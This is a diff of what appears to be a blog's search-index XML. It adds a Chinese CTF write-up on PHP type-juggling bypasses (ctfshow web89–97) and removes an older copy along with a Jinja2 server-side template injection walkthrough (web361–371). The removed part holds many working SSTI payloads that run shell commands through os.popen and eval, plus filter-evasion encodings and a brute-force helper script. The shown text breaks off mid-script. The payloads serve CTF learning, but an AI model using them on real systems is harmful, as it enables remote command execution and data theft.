@@ -331,6 +331,64 @@
       </tags>
   </entry>
   <entry>
+    <title>PHP特性ctfshow</title>
+    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
+    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
+
+<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
+<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
+<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
+<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
+<p>所以把4476转为16进制，在开头加入0x传入即可</p>
+<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
+<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
+<p>i:不区分大小写匹配</p>
+<p>m:以每行为一个单位匹配</p>
+<p>^:匹配单位的开头</p>
+<p>$:匹配单位的末尾</p>
+<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
+<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
+<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
+<p><strong>payload:%0aphp</strong></p>
+<p>%0a是url编码的换行符</p>
+<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
+<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
+<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
+<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
+<p>上面说了0开头会以八进制识别</p>
+<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
+<p>要想输出flag，有三个条件</p>
+<p>1.num不能强等于4476</p>
+<p>2.num中不能有字母</p>
+<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
+<p>第一种方法:</p>
+<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
+<p>第二种方法:</p>
+<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
+<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
+<p>弱等于，用以上第一种方法</p>
+<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
+<p>传入.&#x2F;flag.php即可</p>
+<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
+<p>强度于，数组绕过</p>
+<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
+<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
+<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>入门</tag>
+        <tag>学习</tag>
+        <tag>php</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>JavaWeb中级学习笔记</title>
     <url>/2024/03/22/JavaWeb%E4%B8%AD%E7%BA%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>
@@ -390,169 +448,6 @@
       <tags>
         <tag>ctf</tag>
         <tag>备忘</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP特性ctfshow</title>
-    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
-
-<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
-<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
-<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
-<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
-<p>所以把4476转为16进制，在开头加入0x传入即可</p>
-<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
-<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
-<p>i:不区分大小写匹配</p>
-<p>m:以每行为一个单位匹配</p>
-<p>^:匹配单位的开头</p>
-<p>$:匹配单位的末尾</p>
-<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
-<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
-<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
-<p><strong>payload:%0aphp</strong></p>
-<p>%0a是url编码的换行符</p>
-<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
-<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
-<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
-<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
-<p>上面说了0开头会以八进制识别</p>
-<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
-<p>要想输出flag，有三个条件</p>
-<p>1.num不能强等于4476</p>
-<p>2.num中不能有字母</p>
-<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
-<p>第一种方法:</p>
-<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
-<p>第二种方法:</p>
-<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
-<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
-<p>弱等于，用以上第一种方法</p>
-<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
-<p>传入.&#x2F;flag.php即可</p>
-<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
-<p>强度于，数组绕过</p>
-<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
-<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
-<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>ctfshow</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>入门</tag>
-        <tag>学习</tag>
-        <tag>php</tag>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSTI-CTFSHOW</title>
-    <url>/2024/04/12/SSTI-CTFSHOW-1/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
-
-<p><a class="link"   href="https://boogipop.com/2023/03/02/CTFSHOW-SSTI/" >CTFSHOW-SSTI - Boogiepop Doesn’t Laugh (boogipop.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>巨几把详细，使我逐渐理解一切</p>
-<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240329185224740.png"  alt="image-20240329185224740"></p>
-<p>需要在url传入name&#x3D;payload</p>
-<p>但是我们并不知道subclasses()后，os._wrap_close类在哪</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185402511.png"  alt="image-20240329185402511"></p>
-<p>小写了个脚本去找</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">  text = <span class="built_in">input</span>(<span class="string">&quot;[+]需要查找的文本为:&quot;</span>)</span><br><span class="line">  pattern = <span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]你可能要找的类有:os._wrap_close,file,site._Printer,subprocess.Popen,warnings.catch_warnings&quot;</span>)</span><br><span class="line">  find = <span class="built_in">input</span>(<span class="string">&quot;[+]需要匹配的类为:&quot;</span>)</span><br><span class="line">  result = re.findall(pattern,text)</span><br><span class="line">  <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">      <span class="keyword">if</span>(re.<span class="keyword">match</span>(find,val)):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;[-]下标为&quot;</span>,i)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;[+]继续扣1结束扣0:&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185449121.png"  alt="image-20240329185449121"></p>
-<p>进而payload&#x3D;<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
-<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240403152139654.png"  alt="image-20240403152139654"></p>
-<p>一样的name传参，把上题的payload放了进去，给我回了个板脸</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153827422.png"  alt="image-20240403153827422"></p>
-<p>不知道禁了什么，我们把payload一个字一个字拆开再用burpsuite爆破进行fuzz</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">input</span>(<span class="string">&quot;[+]需要拆解的文本为&quot;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;dep.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    file.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153936033.png"  alt="image-20240403153936033"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153954072.png"  alt="image-20240403153954072"></p>
-<p>发现把2和3ban掉了，相当于想ban掉<code>os._wrap_close</code>呗</p>
-<p>payload1:<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[147-15].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
-<p>payload2:<code>?name=&#123;%set b=(dict(b=c,c=d)|join|count)%&#125;&#123;&#123;''.__class__.__base__.__subclasses__()[66*b].__init__.__globals__['popen']('tac /f*').read()&#125;&#125;</code></p>
-<p>payload3:<code>?name=&#123;&#123;x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')&#125;&#125;</code></p>
-<p>payload4:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>最喜欢的最短的一个:</p>
-<p>payload5:<code>name=&#123;&#123;lipsum.__global__.os.popen('cat /flag')&#125;&#125;</code></p>
-<p>变种最多的一集，在网上看到很多，不过都2024了还会有开发人员犯这个病吗，实战估计是用不到了</p>
-<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240408173012712.png"  alt="image-20240408173012712"></p>
-<p>参数逃逸，好喜欢，高效帅气巧妙</p>
-<p>payload:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.args.gogogo)&#125;&#125;&amp;gogogo=__import__(%27os%27).popen(%27cat%20/flag%27).read()</code></p>
-<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><p>ban掉了arg和单双引号</p>
-<p>payload2:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.gogogo)&#125;&#125;</code></p>
-<p>再在cookie加入<code>gogogo=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>即可</p>
-<p>我才知道cookie传多个值是需要分号而不是&amp;</p>
-<p>而且这里传入的cookie不能有字符是url编码的，不知道是hackbar不帮我编码呢，还是服务器不帮我解码呢，还是说cookie本来就不需要url编解码</p>
-<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><p>在前ban掉了arg和单双引号和中括号</p>
-<p>和上题一样的payload</p>
-<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><p>ban掉了下划线</p>
-<p>payload1:<code>?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</code></p>
-<p>payload2:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
-<p>d原来之前可以不用cookie，用values就好</p>
-<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><p>之前的基础上禁用了os</p>
-<p>payload1:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
-<p>payload2:<code>name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
-<p>这里get方法想出来很顺滑，因为一开始咱们想把os逃出来可以想的是reque.values.gogo，但是这个弄出来只能返回字符串”os”,并不能返回类os,所以用get</p>
-<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#过滤了&#123;&#123;,用&#123;%%&#125;加print即可</span><br></pre></td></tr></table></figure>
-
-<p>payload:<code>name=s&#123;%print((lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read())%&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
-<p>print里的改为上面的payload2一样的</p>
-<h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><p>以上基础上ban了request</p>
-<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h3><p>有点小复杂，要写脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line"> payload=<span class="built_in">input</span>(<span class="string">&quot;要找啥&quot;</span>)</span><br><span class="line"> fpayload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">   url=<span class="string">f&quot;http://e870d70a-c035-4b9e-8e6c-f6137ed08cbe.challenge.ctf.show//?name=&#123;&#123;%print((config|string|list).pop(<span class="subst">&#123;i&#125;</span>).lower())%&#125;&#125;&quot;</span></span><br><span class="line">   r = requests.get(url=url)</span><br><span class="line">   index = r.text.find(<span class="string">&#x27;&lt;h3&gt;&#x27;</span>)</span><br><span class="line">   single = r.text[index+<span class="number">4</span>:index+<span class="number">5</span>].lower()</span><br><span class="line">  <span class="comment">#print(f&quot;[+]&#123;j&#125;&quot;)</span></span><br><span class="line">  <span class="comment">#print(single)</span></span><br><span class="line">   <span class="keyword">if</span> j==single:</span><br><span class="line">    fpayload+=<span class="string">f&quot;(config|string|list).pop(<span class="subst">&#123;i&#125;</span>)~&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(payload)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(fpayload)</span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;继续不&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>思路是把<code>&#123;%print((lipsum|attr('__globals__')).get('os').popen('cat /flag').read())%&#125;</code>这个里面的<code>__globals__</code>和<code>os</code>和<code>cat /flag</code>替换就好</p>
-<p>payload:我的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read())%&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h3><p>通过设置变量和拼接变量合成一句话</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(24) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set init=(a,a,dict(init=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set chr=a.chr %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br><span class="line">#合成一句话：</span><br><span class="line">?name=&#123;% set a=(()|select|string|list).pop(24) %&#125;&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;% set chr=a.chr %&#125;</span><br><span class="line">&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br></pre></td></tr></table></figure>
-
-<p>相当于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lipsum.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 在__builtins__里面拿到chr，同样可以很方便的构造字符</span><br></pre></td></tr></table></figure>
-
-<h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><p>过滤了数字,要用cout构造数字</p>
-<p>比如dict{aaaaaa&#x3D;a|join|cout}是等于6的，键值有多少个字符，这个表达式就代表几个数字，想办法用这个格式把上题的payload中的数字替换即可</p>
-<p>payload1:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#32</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#47</span><br><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; #24</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125; #_</span><br><span class="line">&#123;%set o=dict(o=a,s=b)|join%&#125;</span><br><span class="line">#os</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">#得到__globals__前面的join是把globals变为字符串</span><br><span class="line">&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;</span><br><span class="line">#__builtins__</span><br><span class="line">&#123;%set c=dict(chr=a)|join%&#125;</span><br><span class="line">#chr</span><br><span class="line">&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;</span><br><span class="line">#chr函数</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">#cat /flag</span><br><span class="line">&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br><span class="line">#最终payload如下</span><br><span class="line">?name=&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set x=(()|select|string|list).pop(num)%&#125;&#123;%set o=dict(o=a,s=b)|join%&#125;&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;&#123;%set c=dict(chr=a)|join%&#125;&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;&#123;%set cmd=chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload2:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125;</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">&#123;%set builtins=x~x~(dict(builtins=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set c = dict(chr=a)|join%&#125;</span><br><span class="line">&#123;%set o = dict(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%set getitem = x~x~(dict(getitem=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;</span><br><span class="line">&#123;%set file = chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><p>过滤了print但还是可以执行命令，用curl带出flag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set one=dict(b=j)|join|count%&#125;</span><br><span class="line">&#123;% set two=dict(bb=j)|join|count%&#125;</span><br><span class="line">&#123;% set three=dict(bbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set four=dict(bbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set five=dict(bbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set six=dict(bbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set seven=dict(bbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set eight=dict(bbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set nine=dict(bbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set ten=dict(bbbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set zero=(one-one)%&#125;</span><br><span class="line">&#123;% set pop=(four*six)%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(pop)%&#125;</span><br><span class="line">&#123;% set global=(a,a,dict(globals=d)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set go=(lipsum|attr(global)).get(built)%&#125;</span><br><span class="line">&#123;% set chr=go.chr%&#125;</span><br><span class="line">&#123;% set cmd=%&#125;</span><br><span class="line">&#123;%if go.eval(cmd)%&#125;</span><br><span class="line">yes</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
-
-<p>cmd生成脚本:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#eg:chr((six~five)|int)~chr((six~six|int))---&gt;AB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#替换123</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">a</span>):</span><br><span class="line">    change = &#123;</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span> : <span class="string">&#x27;zero&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;one&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span> : <span class="string">&#x27;two&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span> : <span class="string">&#x27;three&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span> : <span class="string">&#x27;four&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span> : <span class="string">&#x27;five&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span> : <span class="string">&#x27;six&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span> : <span class="string">&#x27;seven&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;8&#x27;</span> : <span class="string">&#x27;eight&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;9&#x27;</span> : 